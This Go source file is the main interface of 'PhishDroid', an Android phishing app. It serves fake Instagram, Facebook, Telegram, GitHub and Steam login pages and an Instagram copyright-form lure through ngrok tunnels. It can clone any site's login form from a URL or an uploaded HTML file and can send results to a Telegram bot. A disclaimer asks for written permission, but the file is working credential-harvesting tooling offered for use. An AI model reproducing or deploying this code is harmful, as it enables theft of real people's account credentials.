package main

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/raifpy/Go/errHandler"

	"fyne.io/fyne/layout"

	"fyne.io/fyne/canvas"

	"fyne.io/fyne"
	"fyne.io/fyne/app"
	"fyne.io/fyne/dialog"
	"fyne.io/fyne/theme"
	"fyne.io/fyne/widget"
)

var version float64 = 0.3
var useTelegramBot = false
var isThisOtoTGBot = false
var tg tgBot
var ram runtime.MemStats
var cizgi = widget.NewToolbarSeparator().ToolbarObject()
var space = widget.NewLabel("")

func islem(win fyne.Window, uyg fyne.App, typePhis string) {
	var fonksiyon func(chan bool, fyne.Window, *widget.TextGrid, *string)
	switch typePhis {
	case "InstagramTelif":
		fonksiyon = serveInstagramTelif
	case "InstagramLogin":
		fonksiyon = serveInstagramLogin
	case "GithubLogin":
		fonksiyon = serveGithubLogin
	case "SteamLogin":
		fonksiyon = serveSteamLogin
	case "MyTelegramLogin":
		fonksiyon = serveMyTelegramLogin
	case "FacebookLogin":
		fonksiyon = serveFacebookLogin
	default:
		dialog.ShowError(fmt.Errorf("Dev Error !\nUnDefinied PhishType"), win)
		return
	}
	//fmt.Println("Merhaba Dünya")
	text := widget.NewTextGridFromString("url waiting...")
	//textGrid := widget.NewTextGrid()
	//textGrid := widget.NewLabelWithStyle("", fyne.TextAlignLeading, fyne.TextStyle{Bold: false, Italic: true, true})
	textGrid := widget.NewTextGrid()
	//textGrid.SetStyle(1, 1, nil)
	/*copyButton := widget.NewButtonWithIcon(" Copy", theme.ContentCopyIcon(), func() {
		//win.Clipboard().SetContent(text.Text())
		uyg.SendNotification(fyne.NewNotification("PhishDroid", text.Text()))
	})*/
	//textGroup := widget.NewScrollContainer(textGrid)
	stopChan := make(chan bool)

	back := widget.NewButtonWithIcon("Back", theme.NavigateBackIcon(), func() {
		gui(uyg, win)
	})

	var stopBool = false
	var runStopButton *widget.Button
	runStopButton = widget.NewButtonWithIcon("Run", theme.MediaPlayIcon(), func() {
		if stopBool {

			stopChan <- true
			stopBool = false
			back.Enable()

			runStopButton.SetText("Run")
			runStopButton.SetIcon(theme.MediaPlayIcon())

			runtime.GC()
			return
		}
		if !checkNgrok() {
			text.SetText("ngrok not found!")
			return
		}
		//ngrokCmd, err := runNgrok("8080")
		_, err := runNgrok("8089")
		if err != nil {
			dialog.ShowError(err, win)
		}
		var textStream string
		go fonksiyon(stopChan, win, textGrid, &textStream)
		ngrokurl, err := getNgrokLinkStable()
		if err != nil {
			dialog.ShowError(err, win)
			return
		}
		text.SetText(ngrokurl)

		urlNgrok, err := url.Parse(ngrokurl)
		if err != nil {
			dialog.ShowError(err, win)
		}
		go uyg.OpenURL(urlNgrok)
		stopBool = true
		runStopButton.SetText("Stop")
		runStopButton.SetIcon(theme.MediaPauseIcon())
		back.Disable()
		runtime.GC()

	})

	group := widget.NewGroupWithScroller("PhishDroid", text, cizgi, runStopButton, back, textGrid)

	win.SetContent(group)

	runtime.GC()

}

func main() {
	defer func() {
		rec := recover()
		if rec != nil {
			log.Println(rec)
			os.Exit(1)
		}
	}()

	runtime.LockOSThread()
	os.Chdir("/data/data/org.codeksiyon.phishdroid")

	uyg := app.New()
	notiApp = uyg
	uyg.Settings().SetTheme(theme.DarkTheme())
	//kanal := make(chan bool)

	win := uyg.NewWindow("PhishDroid Beta")

	defer func() {
		rec := recover()
		if rec != nil {
			dialog.ShowError(fmt.Errorf(rec.(string)), win)
			os.Exit(1)
		}
	}()

	win.SetIcon(resourceFesPng)

	icon := canvas.NewImageFromResource(resourceFesPng)
	icon.FillMode = canvas.ImageFillOriginal

	phishdroidText := widget.NewLabelWithStyle("PhishDroid  B E T A", fyne.TextAlignCenter, fyne.TextStyle{true, false, false})
	codeksyinText := widget.NewLabelWithStyle("©Codeksiyon Freemium", fyne.TextAlignCenter, fyne.TextStyle{false, true, true})
	infinity := widget.NewProgressBarInfinite()
	infinity.Start()

	versionText := "\nVersion " + fmt.Sprint(version) + "\nArch " + runtime.GOARCH
	versionLabel := widget.NewLabelWithStyle(versionText, fyne.TextAlignCenter, fyne.TextStyle{false, true, true})

	vbox := widget.NewVBox(icon, phishdroidText, space, cizgi, versionLabel, space, cizgi, space, codeksyinText, space, infinity)

	win.SetContent(vbox)
	go func() {
		if _, err := os.Stat("./ok"); os.IsNotExist(err) {

			dialog.ShowConfirm("DISCLAIMER", "The use of the PhishDroid & its phishing-pages\nis COMPLETE RESPONSIBILITY of the END-USER.\nDevelopers assume NO liability and\nNOT responsiblefor any misuse or damage\ncaused by this program. Also we inform\nyou that some of your your actions\nmay be ILLEGAL and you CAN NOT\nuse this software to test person\nor company without\nWRITTEN PERMISSION from them.", func(tim bool) {
				if !tim {
					log.Println("Oh No :D")
					uyg.Quit()
					os.Exit(1)
				} else {
					if f, err := os.Create("./ok"); err == nil {
						f.Close()
					} else {
						dialog.ShowError(err, win)
					}

				}
			}, win)
		}
		time.Sleep(time.Second * 7)
		gui(uyg, win)
		runtime.GC()
	}()
	runtime.GC()
	win.ShowAndRun()

}

func gui(uyg fyne.App, win fyne.Window) {
	go func() {

		if checkNgrok() { // if ngrok already avaible

			if checkTGBotAvaible() { // vers 0.2
				tgo, err := getTGBot()
				if errHandler.HandlerBool(err) {
					return
				}
				tg = *tgo

				useTelegramBot = true
				isThisOtoTGBot = true
				fmt.Println(tg)

			}
			return
			//
		}
		time.Sleep(time.Second * 3)
		infi := dialog.NewProgressInfinite("ngrok downloading", "Ngrok downloading for your arch ("+runtime.GOARCH+")", win)
		go func() {
			err := getNgrok()
			if err != nil {
				dialog.NewError(err, win)
			}
			infi.Hide()
		}()
		infi.Show()

		runtime.GC()
	}()

	customLabel := widget.NewLabel("You can use every site's template [unstable]")
	customText := widget.NewTextGridFromString("Type your site and press go!")
	customEntry := widget.NewEntry()
	customEntry.SetPlaceHolder("https://someTestSite/login")

	customButon := widget.NewButtonWithIcon("Go", theme.ConfirmIcon(), func() {
		if strings.Trim(customEntry.Text, " ") == "" {
			dialog.ShowInformation("Empty Url", "Fill entry :9", win)
			return
		}

		infi := dialog.NewProgressInfinite("Waiting Request", "Just a second...", win)
		infi.Show()
		resp, err := httpForCustumHTML(customEntry.Text)
		if errHandler.HandlerBool(err) {
			infi.Hide()
			dialog.ShowError(err.(error), win)

			return
		}
		infi.Hide()

		infi = dialog.NewProgressInfinite("Waiting Ngrok", "Just a second...", win)
		infi.Show()
		runNgrok("8089")
		serverLink, err := getNgrokLinkStable()
		infi.Hide()
		if err != nil {
			dialog.ShowError(err, win)
			serverLink = "http://127.0.0.1:8089"
		}

		fmt.Println(serverLink)

		oye := customHTMLwithHTTP(resp.Body, customEntry.Text, serverLink)
		if err, ok := oye["error"]; ok {
			dialog.ShowError(err.(error), win)
			return
		}

		values := oye["values"].([]string)
		html := oye["html"].(string)

		if len(values) == 0 {
			dialog.ShowInformation("form-input", "Maybe this page\n("+customEntry.Text+")\n isn't login page...", win)
		}

		go func() {
			makeCustomWindow(win, uyg, html, serverLink, customEntry.Text)
		}()
		//openurl, _ := url.Parse(serverLink)
		//uyg.OpenURL(openurl)
	})
	customBack := widget.NewButtonWithIcon("Back", theme.NavigateBackIcon(), func() { gui(uyg, win) })
	customgroup := widget.NewGroup("Custom Template", customLabel, customText, customEntry, customButon, customBack, space, cizgi)
	custom := widget.NewButton(">- Custom", func() { win.SetContent(customgroup) })

	selectHTML := widget.NewButton("Select HTML file", func() {
		//dialog.ShowCustomConfirm()
		dialog.ShowFileOpen(func(uri fyne.URIReadCloser, err error) {
			if uri == nil {
				return
			}
			mime := uri.URI().MimeType()
			if str := strings.Split(mime, "/"); len(str) < 2 {
				dialog.ShowInformation("Wrong File!", fmt.Sprintf("Emm.\n%s isn't html type.", mime), win)
				return
			} else if mime != "text/html" && str[0] != "text" {
				dialog.ShowInformation("Wrong File!", fmt.Sprintf("Emm.\n%s isn't html type.", mime), win)
				return
			}
			hamVeri, err := ioutil.ReadAll(uri)
			if errHandler.HandlerBool(err) {
				dialog.ShowError(err, win)
				return
			}
			fmt.Println(string(hamVeri))
			if len(hamVeri) == 0 {
				dialog.ShowError(errors.New("html file has to be full"), win)
				return
			}
			fmt.Println("\n" + string(hamVeri))

			infi := dialog.NewProgressInfinite("Waiting Ngrok", "Just a second...", win)
			infi.Show()
			runNgrok("8089")
			serverLink, err := getNgrokLinkStable()
			infi.Hide()
			if err != nil {
				dialog.ShowError(err, win)
				serverLink = "http://127.0.0.1:8089"
			}

			//customngroklink.SetText(serverLink)
			//fmt.Println(serverLink)

			//var response *http.Response
			//response.Write(bytes.NewBuffer(hamVeri))
			oye := customHTMLwithHTTP(bytes.NewReader(hamVeri), "", serverLink)

			if err, ok := oye["error"]; ok {
				dialog.ShowError(err.(error), win)
				return
			}
			//scripts := oye["scripts"].(int)
			values := oye["values"].([]string)
			html := oye["html"].(string)

			//dialog.ShowInformation("Custom Values", fmt.Sprintf("Detected %d script tags.\nform values;\n%s", scripts, strings.Join(values, "\n")), win)
			if len(values) == 0 {

				dialog.ShowInformation("form-input", "Maybe this page\n("+customEntry.Text+")\n isn't login page...", win)
				//return
			}
			go func() {
				makeCustomWindow(win, uyg, html, serverLink, customEntry.Text)
			}()
			/*openurl, _ := url.Parse(serverLink)
			uyg.OpenURL(openurl)*/

		}, win)

	})

	instagratelifmbuton := widget.NewButton("Copyright Form", func() { islem(win, uyg, "InstagramTelif") })
	instagramloginbuton := widget.NewButton("Login Page", func() { islem(win, uyg, "InstagramLogin") })
	instagramGroup := widget.NewGroup("Instagram", instagramloginbuton, instagratelifmbuton, space, cizgi)
	instagram := widget.NewAccordionItem("Instagram", instagramGroup)

	githubLoginButon := widget.NewButton("Login Page", func() { islem(win, uyg, "GithubLogin") })
	githubGroup := widget.NewGroup("Github", githubLoginButon, space, cizgi)
	github := widget.NewAccordionItem("Github", githubGroup)

	steamLoginButon := widget.NewButton("Login Page", func() { islem(win, uyg, "SteamLogin") })
	steamGroup := widget.NewGroup("Steam", steamLoginButon, space, cizgi)
	steam := widget.NewAccordionItem("Steam", steamGroup)

	myTelegramButon := widget.NewButton("MyTelegram Login", func() { islem(win, uyg, "MyTelegramLogin") })
	telegramGroup := widget.NewGroup("Telegram", myTelegramButon, space, cizgi)
	telegram := widget.NewAccordionItem("Telegram", telegramGroup)

	facebookLoginButon := widget.NewButton("Login Page", func() { islem(win, uyg, "FacebookLogin") })
	facebookGroup := widget.NewGroup("Facebook", facebookLoginButon, space, cizgi)
	facebook := widget.NewAccordionItem("Facebook", facebookGroup)

	accortdion := widget.NewAccordionContainer(instagram, facebook, telegram, github, steam)

	settingsButton := widget.NewButtonWithIcon("Settings", theme.SettingsIcon(), func() { // vers 0.2
		useTelegramCheck := widget.NewCheck("Use Telegram Bots", func(tap bool) {
			if !tap {
				isThisOtoTGBot = false
				useTelegramBot = false
				return
			}
			if isThisOtoTGBot {
				return
			}
			tgHash := widget.NewEntry()
			tgHash.SetPlaceHolder("Bot Token (1231312-FGhsdjaa_ss)")

			tgChatID := widget.NewEntry()
			tgChatID.SetPlaceHolder("Chat ID ( 888928282 )")

			go func() {
				if checkTGBotAvaible() {
					oldTG, err := getTGBot()
					if errHandler.HandlerBool(err) {
						return
					}
					tgHash.SetText(oldTG.hash)
					tgChatID.SetText(oldTG.chatID)
				}
			}()

			tgBotVre := widget.NewVBox(tgHash, tgChatID /*, tgButton*/)
			//dialog.ShowCustom("Type Ur Bot", "Back", tgBotVre, win)
			dialog.ShowCustomConfirm("Type Your Bot", "Ok", "Cancel", tgBotVre, func(ok bool) {
				if !ok {
					return
				}
				if tgHash.Text == "" || tgChatID.Text == "" {
					dialog.ShowInformation("Empty Entry", "Please fill all entrys", win)
					return
				}
				tgTest := NewtgBot(tgHash.Text, tgChatID.Text)
				if ok, str := tgTest.test(); !ok {
					dialog.ShowInformation("Telegram Say", str, win)
					return
				}
				err := setTGBot(*tgTest)
				if errHandler.HandlerBool(err) {
					dialog.ShowError(err, win)
					return
				}
				tg = *tgTest
				useTelegramBot = true
				isThisOtoTGBot = true

				dialog.ShowInformation("Done", "We can go!", win)
				return
			}, win)

			/*if checkTGBotAvaible() {
				oldTG, err := getTGBot()
				if errHandler.HandlerBool(err) {
					dialog.ShowError(err, win)
					return
				}


			}*/
		})
		if useTelegramBot {
			useTelegramCheck.SetChecked(true)
		}
		//useTelegramContent := widget.NewGroup("Use Telegram-Bot")
		dialog.ShowCustom("Settings", "< Ok >", useTelegramCheck, win)
	})

	aboutTitle := widget.NewLabel("PhishDroid OpenSource GoLang Application")
	runtime.ReadMemStats(&ram)
	versionArch := widget.NewTextGridFromString(fmt.Sprintf("\nVersion %s\nArch    %s\nGoVers  %s\nGoRoutine %d\nUsedRam %d mb", fmt.Sprint(version), runtime.GOARCH, runtime.Version(), runtime.NumGoroutine(), (ram.Alloc / 1024 / 1024)))

	codeksiyonURL, _ := url.Parse("https://t.me/codeksiyon")
	githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid")
	releasesURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid/releases")
	aboutGroup := widget.NewVBox(aboutTitle, versionArch, space, cizgi, fyne.NewContainerWithLayout(layout.NewHBoxLayout(), widget.NewHyperlink("Codeksiyon", codeksiyonURL), widget.NewHyperlink("PhishDroid", githubURL), widget.NewHyperlink("Releases", releasesURL)))
	about := widget.NewButtonWithIcon("About", theme.InfoIcon(), func() {
		dialog.ShowCustom("About", "Back", aboutGroup, win)
	})
	cisim := canvas.NewImageFromResource(resourceTakPng)
	cisim.FillMode = canvas.ImageFillOriginal
	group := widget.NewGroupWithScroller("PhishDroid  B E T A", accortdion, custom, selectHTML, settingsButton, about, cisim, cizgi, widget.NewLabelWithStyle("@codeksiyon GPL3+", fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false}))
	go func() { // Check; is avaible new version
		verReq, err := http.Get("https://raw.githubusercontent.com/codeksiyon/PhishDroid/master/version")
		if errHandler.HandlerBool(err) {
			//group.Append(widget.NewTextGridFromString(err.Error()))
			return
		}
		ham, _ := ioutil.ReadAll(verReq.Body)
		hamStr := strings.Trim(string(ham), "\n")
		reqVer, err := strconv.ParseFloat(hamStr, 1)
		if errHandler.HandlerBool(err) {
			return
		}

		if reqVer > version {

			// on vers; 0.2
			var news string
			wnReq, err := http.Get("https://raw.githubusercontent.com/codeksiyon/PhishDroid/master/news")
			if !errHandler.HandlerBool(err) { // if there is no error
				newsByte, _ := ioutil.ReadAll(wnReq.Body)
				news = string(newsByte)

			}

			//

			log.Println("Detected new version!")
			newverslabel := widget.NewLabelWithStyle("New PhishDroid Version Avaible ! -> "+hamStr, fyne.TextAlignCenter, fyne.TextStyle{Bold: false, Italic: true, Monospace: false})
			whatsnewlabel := widget.NewTextGridFromString(news)
			newversbuton := widget.NewButton("Download", func() {
				githubURL, _ := url.Parse("https://github.com/codeksiyon/PhishDroid/releases")
				uyg.OpenURL(githubURL)

			})

			laylay := fyne.NewContainerWithLayout(layout.NewGridLayoutWithRows(3), newverslabel, whatsnewlabel, newversbuton)

			group.Append(laylay)

		}
		runtime.GC()

	}()

	win.SetContent(group)
}

// ÇORBAAA
